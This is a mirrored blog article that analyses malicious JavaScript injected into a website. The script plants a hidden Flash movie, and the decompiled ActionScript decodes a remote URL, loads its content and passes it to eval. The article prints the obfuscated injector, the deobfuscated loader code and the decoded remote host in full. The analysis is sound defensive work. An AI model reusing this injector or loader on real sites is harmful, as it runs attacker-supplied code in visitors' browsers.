<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Virus on the site or reverse engineering Exploit.SWF.254</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="It all started with the fact that on my working laptop (Win XP) the admin installed a new antivirus. One day, when I went to one of my sites, I discov...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Virus on the site or reverse engineering Exploit.SWF.254</h1><div class="post__text post__text-html js-mediator-article">  It all started with the fact that on my working laptop (Win XP) the admin installed a new antivirus.  One day, when I went to one of my sites, I discovered this unpleasant picture: <br><br><img src="https://habrastorage.org/storage3/65c/fed/16c/65cfed16cacc3440d67afbc5bd41cd5c.jpg"><br><br>  <b>Update:</b> Dr.Web anti-virus, the script is still on the site <a href="">here</a> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Of course, the first thing I wanted to do was remove it, for that you just had to go through FTP and nail down the rss.js file.  But then it suddenly turned out that I could not access the site via FTP, since hosting and domain are not mine, and apparently the admins recently changed their login and password.  The owners did not manage to get through, but it was curious what exactly the virus was doing ... <br><br><a name="habracut"></a><br><br>  So, I did not dare to do this on a working laptop, I decided to do this at home, since Makos <s>had to be afraid of having a</s> home computer, there <s>was nothing</s> antivirus would yell at and not interfere with working.  First of all I looked at what rss.js does <br><br><pre><code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">addNewObject</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ua = navigator.userAgent.toLowerCase(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((ua.indexOf(<span class="hljs-string"><span class="hljs-string">"chrome"</span></span>) == <span class="hljs-number"><span class="hljs-number">-1</span></span> &amp;&amp; ua.indexOf(<span class="hljs-string"><span class="hljs-string">"win"</span></span>) != <span class="hljs-number"><span class="hljs-number">-1</span></span>) &amp;&amp; navigator.javaEnabled()) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> jtFRvRDNg=[<span class="hljs-string"><span class="hljs-string">"subs\x74\x72"</span></span>,<span class="hljs-string"><span class="hljs-string">"F\x55\x64\x59z\x73\x4dVX\x65XZ\x70\x6e\x6e\x79a.\x73wf\x66\x50Myo\x56\x6cV\x76\x43\x52q\x59oeF\x61"</span></span>,<span class="hljs-string"><span class="hljs-string">"\x6aH\x4c/0\x38\x2d\x6bo\x68a\x77POT\x55\x4aGp"</span></span>,<span class="hljs-string"><span class="hljs-string">"\x6f\x73F\x4e\x74x\x2f\x6dp\x33\x2fv\x69di\x72\x76\x61ni"</span></span>];<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> counter = jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">35</span></span><span class="hljs-number"><span class="hljs-number">-32</span></span>][jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">0</span></span>]](<span class="hljs-number"><span class="hljs-number">-60</span></span>+<span class="hljs-number"><span class="hljs-number">95</span></span><span class="hljs-number"><span class="hljs-number">-29</span></span>,<span class="hljs-number"><span class="hljs-number">70</span></span>+<span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-number"><span class="hljs-number">-91</span></span>+<span class="hljs-number"><span class="hljs-number">13</span></span>) + jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">2</span></span>][jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">0</span></span>]](<span class="hljs-number"><span class="hljs-number">94</span></span><span class="hljs-number"><span class="hljs-number">-75</span></span><span class="hljs-number"><span class="hljs-number">-16</span></span>,<span class="hljs-number"><span class="hljs-number">36</span></span>+<span class="hljs-number"><span class="hljs-number">83</span></span><span class="hljs-number"><span class="hljs-number">-111</span></span>) + jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">17</span></span><span class="hljs-number"><span class="hljs-number">-16</span></span>][jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">0</span></span>]](<span class="hljs-number"><span class="hljs-number">66</span></span>+<span class="hljs-number"><span class="hljs-number">2</span></span>+<span class="hljs-number"><span class="hljs-number">81</span></span><span class="hljs-number"><span class="hljs-number">-135</span></span>,<span class="hljs-number"><span class="hljs-number">51</span></span><span class="hljs-number"><span class="hljs-number">-44</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> div = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'div'</span></span>); div.innerHTML = <span class="hljs-string"><span class="hljs-string">'&lt;object id="dummy" name="dummy" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="1" height="1"&gt;'</span></span>; div.innerHTML += <span class="hljs-string"><span class="hljs-string">'&lt;param name="allowScriptAccess" value="always" \/&gt;'</span></span>; div.innerHTML += <span class="hljs-string"><span class="hljs-string">'&lt;param name="movie" value="'</span></span>+ counter +<span class="hljs-string"><span class="hljs-string">'" \/&gt;'</span></span>; div.innerHTML += <span class="hljs-string"><span class="hljs-string">'&lt;embed id="dummy2" name="dummy2" src="'</span></span>+ counter +<span class="hljs-string"><span class="hljs-string">'" width="1" height="1" name="flash" allowScriptAccess="always" type="application\/x-shockwave-flash" \/&gt;'</span></span>; div.innerHTML += <span class="hljs-string"><span class="hljs-string">'&lt;\/object&gt;'</span></span>; div.style.position = <span class="hljs-string"><span class="hljs-string">'absolute'</span></span>; div.style.left = <span class="hljs-string"><span class="hljs-string">'-100px'</span></span>; div.style.top = <span class="hljs-string"><span class="hljs-string">'-100px'</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.body.insertBefore(div, <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.body.children[<span class="hljs-number"><span class="hljs-number">0</span></span>]); } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (e) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.body == <span class="hljs-literal"><span class="hljs-literal">undefined</span></span> || <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.body.children[<span class="hljs-number"><span class="hljs-number">0</span></span>] == <span class="hljs-literal"><span class="hljs-literal">undefined</span></span>) { setTimeout(<span class="hljs-string"><span class="hljs-string">'addNewObject()'</span></span>, <span class="hljs-number"><span class="hljs-number">50</span></span>); } } } addNewObject();</code> </pre> <br><br>  It is obvious from the code that the script creates swf and injects it into the page code in order to understand where it takes the swf and do deobfuscation of this strange piece of code: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> jtFRvRDNg=[<span class="hljs-string"><span class="hljs-string">"subs\x74\x72"</span></span>,<span class="hljs-string"><span class="hljs-string">"F\x55\x64\x59z\x73\x4dVX\x65XZ\x70\x6e\x6e\x79a.\x73wf\x66\x50Myo\x56\x6cV\x76\x43\x52q\x59oeF\x61"</span></span>,<span class="hljs-string"><span class="hljs-string">"\x6aH\x4c/0\x38\x2d\x6bo\x68a\x77POT\x55\x4aGp"</span></span>,<span class="hljs-string"><span class="hljs-string">"\x6f\x73F\x4e\x74x\x2f\x6dp\x33\x2fv\x69di\x72\x76\x61ni"</span></span>];<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> counter = jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">35</span></span><span class="hljs-number"><span class="hljs-number">-32</span></span>][jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">0</span></span>]](<span class="hljs-number"><span class="hljs-number">-60</span></span>+<span class="hljs-number"><span class="hljs-number">95</span></span><span class="hljs-number"><span class="hljs-number">-29</span></span>,<span class="hljs-number"><span class="hljs-number">70</span></span>+<span class="hljs-number"><span class="hljs-number">22</span></span><span class="hljs-number"><span class="hljs-number">-91</span></span>+<span class="hljs-number"><span class="hljs-number">13</span></span>) + jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">2</span></span>][jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">0</span></span>]](<span class="hljs-number"><span class="hljs-number">94</span></span><span class="hljs-number"><span class="hljs-number">-75</span></span><span class="hljs-number"><span class="hljs-number">-16</span></span>,<span class="hljs-number"><span class="hljs-number">36</span></span>+<span class="hljs-number"><span class="hljs-number">83</span></span><span class="hljs-number"><span class="hljs-number">-111</span></span>) + jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">17</span></span><span class="hljs-number"><span class="hljs-number">-16</span></span>][jtFRvRDNg[<span class="hljs-number"><span class="hljs-number">0</span></span>]](<span class="hljs-number"><span class="hljs-number">66</span></span>+<span class="hljs-number"><span class="hljs-number">2</span></span>+<span class="hljs-number"><span class="hljs-number">81</span></span><span class="hljs-number"><span class="hljs-number">-135</span></span>,<span class="hljs-number"><span class="hljs-number">51</span></span><span class="hljs-number"><span class="hljs-number">-44</span></span>);</code> </pre> <br><br>  To do this, create and run such a simple file. <br><br><pre> <code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text/javascript"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> jtFRvRDNg = [</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"subs\x74\x72"</span></span></span><span class="actionscript">, </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"F\x55\x64\x59z\x73\x4dVX\x65XZ\x70\x6e\x6e\x79a.\x73wf\x66\x50Myo\x56\x6cV\x76\x43\x52q\x59oeF\x61"</span></span></span><span class="actionscript">, </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"\x6aH\x4c/0\x38\x2d\x6bo\x68a\x77POT\x55\x4aGp"</span></span></span><span class="actionscript">, </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"\x6f\x73F\x4e\x74x\x2f\x6dp\x33\x2fv\x69di\x72\x76\x61ni"</span></span></span><span class="actionscript">]; </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> counter = jtFRvRDNg[</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">35</span></span></span><span class="actionscript"> - </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">32</span></span></span><span class="actionscript">][jtFRvRDNg[</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">0</span></span></span><span class="actionscript">]](</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">-60</span></span></span><span class="actionscript"> + </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">95</span></span></span><span class="actionscript"> - </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">29</span></span></span><span class="actionscript">, </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">70</span></span></span><span class="actionscript"> + </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">22</span></span></span><span class="actionscript"> - </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">91</span></span></span><span class="actionscript"> + </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">13</span></span></span><span class="actionscript">) + jtFRvRDNg[</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">2</span></span></span><span class="actionscript">][jtFRvRDNg[</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">0</span></span></span><span class="actionscript">]](</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">94</span></span></span><span class="actionscript"> - </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">75</span></span></span><span class="actionscript"> - </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">16</span></span></span><span class="actionscript">, </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">36</span></span></span><span class="actionscript"> + </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">83</span></span></span><span class="actionscript"> - </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">111</span></span></span><span class="actionscript">) + jtFRvRDNg[</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">17</span></span></span><span class="actionscript"> - </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">16</span></span></span><span class="actionscript">][jtFRvRDNg[</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">0</span></span></span><span class="actionscript">]](</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">66</span></span></span><span class="actionscript"> + </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">2</span></span></span><span class="actionscript"> + </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">81</span></span></span><span class="actionscript"> - </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">135</span></span></span><span class="actionscript">, </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">51</span></span></span><span class="actionscript"> - </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">44</span></span></span><span class="actionscript">); alert(counter); </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><br>  And immediately we see where the malicious swf is being loaded. <br><br><img src="https://habrastorage.org/storage3/02d/839/dea/02d839dea1e96f8a017632dcd3f56559.jpg"><br><br>  <b>Update:</b> <a href="">Link to swf</a> <br><br>  Now the easiest thing left is to find out what this flash movie is doing, a little googling found several swf decompilers, but it turned out that the file is protected from decompiling <br><br><img src="https://habrastorage.org/storage3/eab/d4f/b1f/eabd4fb1f4e66e5957de692716924af1.jpg"><br><br>  <b>Update:</b> This is <a href="http://www.kindi.com/">what</a> ‚Äúprotected‚Äù swf from decompiling <br><br>  And it is impossible to understand what malicious ActionScript does with the naked eye: <br><br><div class="spoiler">  <b class="spoiler_title">Long incomprehensible code</b> <div class="spoiler_text"><pre> <code class="actionscript hljs"><span class="hljs-comment"><span class="hljs-comment">// 0 // Action tag #0 for (;;) { if (1847114876 == 1847115088) { false; 1238734783 &amp; -1238734784; function decrypt(hex) { var __reg5; var __local0; if (205673138 ^ 205673138) { __local0 = __reg5 = "A"; } else { __reg5 = "A"; var __reg1; __local0 = __reg1 = 0; } __local0; for (;;) { 408838581 ^ 408838581; 2136550932 &amp; -2136550933; if (__reg1 &gt;= hex.B) { break; } if (1890669217 ^ 1890669217) { "C"; } else { var __reg3; if (!(1502222836 ^ 1502222836)) { __reg3 = hex.C(__reg1, 2); } } 1234629013 ^ 1234629013; 127070979 &amp; -127070980; var __reg2 = int("D" + __reg3); 1130412752 ^ 1130412752; __reg2 = __reg2 ^ 5; 1618839222 &amp; -1618839223; if (!(1876906722 ^ 1876906722)) { __reg5 = __reg5 + chr(__reg2); } var __local1; var __local2; if (1459356484 ^ 1459356484) { __local1 = __reg1; __local2 = 2; } else { __reg1 = __reg1 + 2; __local1 = 1035411512; __local2 = -1035411513; } __local1 &amp; __local2; } return __reg5; } function checkFileLoaded() { }; 1791047020 &amp; -1791047021; var = ""; 1234090841 ^ 1234090841; 353477196 ^ 353477196; if (!(1023518590 ^ 1023518590)) { ("E", ()); } 1053853491 &amp; -1053853492; 657257249 &amp; -657257250; var = (, 200); 503511606 ^ 503511606; 694364267 ^ 694364267; 2090915988 &amp; -2090915989; loadVariables(G(), E); if (736039747 != 736040114) { continue; } } }</span></span></code> </pre><br></div></div><br><br>  A little googling found the swf decompiler with the built-in deobfuscation function, and now this code is much clearer to read: <br><br><pre> <code class="actionscript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(hex)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _loc5_ = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _loc1_ = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(_loc1_ &lt; hex.length) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _loc3_ = hex.substr(_loc1_,<span class="hljs-number"><span class="hljs-number">2</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _loc2_ = int(<span class="hljs-string"><span class="hljs-string">"0x"</span></span> + _loc3_); _loc2_ = _loc2_ ^ <span class="hljs-number"><span class="hljs-number">5</span></span>; _loc5_ = _loc5_ + chr(_loc2_); _loc1_ = _loc1_ + <span class="hljs-number"><span class="hljs-number">2</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> _loc5_; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">checkFileLoaded</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(container.data != <span class="hljs-literal"><span class="hljs-literal">undefined</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _loc1_ = container.data; _loc1_ = decrypt(_loc1_); flash.external.ExternalInterface.call(<span class="hljs-string"><span class="hljs-string">"eval"</span></span>,_loc1_); clearInterval(loadingInterval); } } <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> url = <span class="hljs-string"><span class="hljs-string">"6d7171753f2a2a7d64717c71642b75752b70642a666a706b7160772a6d6c712a66696c606b715a6160306163353334663c3c353333613d37666366313632633767353c3c313030"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.createEmptyMovieClip(<span class="hljs-string"><span class="hljs-string">"container"</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getNextHighestDepth()); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> loadingInterval = setInterval(checkFileLoaded,<span class="hljs-number"><span class="hljs-number">200</span></span>); loadVariables(decrypt(url),container);</code> </pre> <br><br>  <b>Update:</b> <a href="http://www.free-decompiler.com/flash/download.html">SWF decompiler with deobfuscator</a> <br><br>  Now this is more interesting, we see that there is a url for which there is a ping, but even in the ‚Äúprotected‚Äù swf url is encoded, the guys have tried well.  I didn‚Äôt have a flash editor at hand, found an online action script compiler, copied a piece of code that decodes the pertinent url and displays: <br><br><pre> <code class="actionscript hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Test</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(hex)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _loc5_ = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _loc1_ = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(_loc1_ &lt; hex.length) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _loc3_ = hex.substr(_loc1_,<span class="hljs-number"><span class="hljs-number">2</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> _loc2_ = int(<span class="hljs-string"><span class="hljs-string">"0x"</span></span> + _loc3_); _loc2_ = _loc2_ ^ <span class="hljs-number"><span class="hljs-number">5</span></span>; _loc5_ = _loc5_ + chr(_loc2_); _loc1_ = _loc1_ + <span class="hljs-number"><span class="hljs-number">2</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> _loc5_; } <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Test</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(mc)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> url = <span class="hljs-string"><span class="hljs-string">"6d7171753f2a2a7d64717c71642b75752b70642a666a706b7160772a6d6c712a66696c606b715a6160306163353334663c3c353333613d37666366313632633767353c3c313030"</span></span>; trace(decrypt(url)); } <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(mc:MovieClip)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> test = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Test(mc); } }</code> </pre> <br><br>  <b>Update:</b> Here you can run ActionScript directly in the browser <br><br>  <b>Update:</b> As a result, we get the url: <pre>  <b>http://xatyta.pp.ua/counter/hit/client_de5df061c99066d82cfc437f2b099455</b> </pre><br><br>  The meaning of this exploit remained a mystery for me, someone just collects statistics on a site visit?  And what does Habr think, waiting for comments, can someone come across a similar one? <br><br>  <b>PS I</b> deliberately did not provide links to antivirus, decompilers, online services and other links. <br><br>  Update: added poll <br><br>  <b>Update 2:</b> added links </div><p>Source: <a href="https://habr.com/ru/post/196882/">https://habr.com/ru/post/196882/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../196872/index.html">HTML5 frequency noise generator</a></li>
<li><a href="../196874/index.html">New HP Chromebook 11 is available on Google Play</a></li>
<li><a href="../196876/index.html">Interface Digest, September 2013</a></li>
<li><a href="../196878/index.html">We struggle with the errors of the accelerometer, gyroscope, M7, digital compass and other sensors in the iPhone 5S and not only</a></li>
<li><a href="../196880/index.html">White Graphene protects against rust even at high temperatures.</a></li>
<li><a href="../196884/index.html">With a camera in the clouds. Part 1</a></li>
<li><a href="../196886/index.html">(Archive) Matreshka.js - MK.Object</a></li>
<li><a href="../196888/index.html">"Boost.Asio C ++ Network Programming". Chapter 6: - other features</a></li>
<li><a href="../196894/index.html">Another way to spend money - thanks to the "beloved" mobile operator!</a></li>
<li><a href="../196896/index.html">Ask questions to the experts. How can developers get help from Intel?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>